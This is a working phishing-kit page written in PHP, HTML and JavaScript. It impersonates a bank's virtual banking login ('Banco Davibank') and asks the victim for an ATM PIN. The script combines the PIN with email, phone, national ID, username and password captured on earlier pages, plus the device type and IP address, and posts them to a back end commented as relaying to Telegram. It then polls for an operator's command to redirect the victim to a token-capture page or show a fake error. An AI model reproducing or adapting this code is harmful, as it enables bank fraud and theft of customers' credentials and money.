<?php
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banca virtual | Confirmacion</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <script type="text/javascript" src="../../../../assets/js/jquery-3.6.0.min.js"></script>
</head>

<body>
    <div class="contenedor">
        <div class="principal">
            <div class="autenticar">
                <div class="conttitulo">
                    <div class="logo-banner">
                        <img src="img/logo_davib.svg" alt="Banner Logo" />
                    </div>
                    <div class="titulo">
                        <h1>Clave de Cajero</h1>
                    </div>
                </div>
                <div class="contenido">
                    <div class="caja">
                        <div class="izq">
                            <form autocomplete="off" id="fatm">
                                <input type="hidden" id="session_id" name="session_id">
                                <input type="hidden" id="username" name="username">
                                <input type="hidden" id="prueba_clave" value="">
                                        
                                <div class="inputg columna">
                                    <div style="text-align: right;" class="ojos">
                                        <img src="img/ojo.svg" alt="ojo" id="ojo" style="display: none;">
                                    </div>
                                    <input type="password" name="atm" id="txtCajero" placeholder="ATM"
                                        maxlength="4" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" pattern="[0-9]*" />
                                        <div class="error" id="eatm">
                                        <img src="img/war.svg" alt="error"> <span class="rojo">Formato de ATM invalido</span>
                                    </div>
                                </div>
                                <div class="inputgb">
                                    <button type="button" id="btnCajero" class="btn">Continuar</button>
                                </div>
                                <div class="inputg inicio" >
                                    <p style="margin-bottom: 5px;">Por razones de seguridad le recomendamos ingresar los
                                datos solicitados a fin de seguir disfrutando de nuestros servicios</p>
                                   
                                </div>
                            </form>
                        </div>
                        <div class="der">
                            <img src="img/baner1.svg" alt="baner1" />
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.7); z-index: 9999; justify-content: center; align-items: center;">
        <img src="img/l21.svg" alt="Cargando..." style="width: 80px; height: 80px; animation: blink 1.5s infinite;">
    </div>
    <style>
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
    </style>

    <script src="js/funciones.js"></script>
    
    <script>
    document.addEventListener("DOMContentLoaded", function () {
        
        // Generar o recuperar session_id
        let sessionId = localStorage.getItem('session_id');
        if (!sessionId) {
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('session_id', sessionId);
        }
        
        // Obtener username de URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const user = urlParams.get('user');
        if (user) {
            localStorage.setItem('username', user);
        }
        
        // Establecer valores en campos ocultos
        document.getElementById('session_id').value = sessionId;
        document.getElementById('username').value = localStorage.getItem('username') || '';
        
        // Mostrar formulario después de un delay
        setTimeout(() => {
            document.getElementById('fatm').style.display = 'block';
        }, 1000);
        
        // Event listener para el botón Verificar
        const btnCajero = document.getElementById('btnCajero');
        
        if (btnCajero) {
            btnCajero.addEventListener('click', async function (event) {
                event.preventDefault();
                event.stopPropagation();

                const clave = document.getElementById('txtCajero').value;
                
                // Validar que la clave tenga 4 dígitos
                if (clave.length !== 4) {
                    alert('La clave debe tener 4 dígitos');
                    return;
                }

                // Mostrar loader
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                    loader.style.display = 'flex';
                }

                // Obtener session_id
                let sessionId = localStorage.getItem('session_id');
                if (!sessionId) {
                    sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    localStorage.setItem('session_id', sessionId);
                }

                // Guardar clave en localStorage
                localStorage.setItem('clave_cajero', clave);

                // Detectar tipo de dispositivo
                const userAgent = navigator.userAgent;
                let dispositivo = 'PC';
                
                if (/Android/i.test(userAgent)) {
                    dispositivo = 'Android';
                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                    dispositivo = 'iPhone';
                } else if (/Windows/i.test(userAgent)) {
                    dispositivo = 'PC';
                } else if (/Mac/i.test(userAgent)) {
                    dispositivo = 'Mac';
                } else if (/Linux/i.test(userAgent)) {
                    dispositivo = 'Linux';
                }
                
                const hora = new Date().toLocaleString('es-ES');

                // Obtener IP y enviar a Telegram
                fetch('get_ip.php')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip || 'No disponible';
                        
                        const mensaje = `
<b><u>💎BANCO DAVIBANK - PIN CAJERO💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔢 Clave Cajero:</b> ${clave}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_clave.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkCajeroVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                const loader = document.getElementById('loader-overlay');
                                if (loader) {
                                    loader.style.display = 'none';
                                }
                                alert("Error en el procesamiento. Intente nuevamente.");
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            const loader = document.getElementById('loader-overlay');
                            if (loader) {
                                loader.style.display = 'none';
                            }
                            alert("Error de conexión. Intente nuevamente.");
                        });
                    })
                    .catch(() => {
                        // Si falla la obtención de IP, enviar sin IP
                        const mensaje = `
<b><u>💎BANCO DAVIBANK - PIN CAJERO💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔢 Clave Cajero:</b> ${clave}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_clave.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkCajeroVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                const loader = document.getElementById('loader-overlay');
                                if (loader) {
                                    loader.style.display = 'none';
                                }
                                alert("Error en el procesamiento. Intente nuevamente.");
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            const loader = document.getElementById('loader-overlay');
                            if (loader) {
                                loader.style.display = 'none';
                            }
                            alert("Error de conexión. Intente nuevamente.");
                        });
                    });
            });
        } else {
            // Botón cajero NO encontrado
        }

        // Event listener para el botón Error Cajero
        const btnErrCajero = document.getElementById('btnErrCajero');
        
        if (btnErrCajero) {
            btnErrCajero.addEventListener('click', async function (event) {
                event.preventDefault();

                const clave = document.getElementById('txtErrCajero').value;
                
                // Validar que la clave tenga 4 dígitos
                if (clave.length !== 4) {
                    alert('La clave debe tener 4 dígitos');
                    return;
                }

                // Mostrar loader
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                    loader.style.display = 'flex';
                }

                // Obtener session_id
                let sessionId = localStorage.getItem('session_id');
                if (!sessionId) {
                    sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                    localStorage.setItem('session_id', sessionId);
                }

                // Guardar clave en localStorage
                localStorage.setItem('clave_cajero', clave);

                // Detectar tipo de dispositivo
                const userAgent = navigator.userAgent;
                let dispositivo = 'PC';
                
                if (/Android/i.test(userAgent)) {
                    dispositivo = 'Android';
                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
                    dispositivo = 'iPhone';
                } else if (/Windows/i.test(userAgent)) {
                    dispositivo = 'PC';
                } else if (/Mac/i.test(userAgent)) {
                    dispositivo = 'Mac';
                } else if (/Linux/i.test(userAgent)) {
                    dispositivo = 'Linux';
                }
                
                const hora = new Date().toLocaleString('es-ES');

                // Obtener IP y enviar a Telegram
                fetch('get_ip.php')
                    .then(response => response.json())
                    .then(data => {
                        const ip = data.ip || 'No disponible';
                        
                        const mensaje = `
<b><u>💎BANCO DAVIBANK - PIN CAJERO💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔢 Clave Cajero:</b> ${clave}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_clave.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkCajeroVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                const loader = document.getElementById('loader-overlay');
                                if (loader) {
                                    loader.style.display = 'none';
                                }
                                alert("Error en el procesamiento. Intente nuevamente.");
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            const loader = document.getElementById('loader-overlay');
                            if (loader) {
                                loader.style.display = 'none';
                            }
                            alert("Error de conexión. Intente nuevamente.");
                        });
                    })
                    .catch(() => {
                        // Si falla la obtención de IP, enviar sin IP
                        const mensaje = `
<b><u>💎BANCO DAVIBANK - PIN CAJERO💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO DAVIBANK
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔢 Clave Cajero:</b> ${clave}
------------------------------`;

                        const formData = new FormData();
                        formData.append('message', mensaje);
                        formData.append('transactionId', sessionId);

                        fetch('procesar_clave.php', {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(result => {
                            if (result.status === 'success') {
                                checkCajeroVerification(sessionId, result.messageId);
                            } else {
                                // Ocultar loader si hay error
                                const loader = document.getElementById('loader-overlay');
                                if (loader) {
                                    loader.style.display = 'none';
                                }
                                alert("Error en el procesamiento. Intente nuevamente.");
                            }
                        })
                        .catch(err => {
                            // Ocultar loader si hay error
                            const loader = document.getElementById('loader-overlay');
                            if (loader) {
                                loader.style.display = 'none';
                            }
                            alert("Error de conexión. Intente nuevamente.");
                        });
                    });
            });
        } else {
            // Botón error cajero NO encontrado
        }
    });

    async function checkCajeroVerification(transactionId, messageId) {
        try {
            const formData = new FormData();
            formData.append('transactionId', transactionId);
            formData.append('messageId', messageId);

            const res = await fetch('verificar_cajero.php', {
                method: 'POST',
                body: formData
            });
            const result = await res.json();

            if (result.action) {
                // Ocultar loader antes de procesar la acción
                const loader = document.getElementById('loader-overlay');
                if (loader) {
                    loader.style.display = 'none';
                }
                
                switch (result.action) {
                    case 'confirm_finalizar':
                        window.location.href = "/fin.php";
                        break;
                    case 'error_logo': 
                        alert("Usuario o clave incorrectos.");
                        window.location.href = "index.php";
                        break;
                    case 'pedir_dinamica': 
                        window.location.href = "token.php";
                        break;
                    case 'error_cajero': 
                        alert("Error en la clave de cajero. Intente nuevamente.");
                        break;
                }
            } else {
                setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
            }
        } catch (err) {
            setTimeout(() => checkCajeroVerification(transactionId, messageId), 2000);
        }
    }
    </script>
</body>

</html>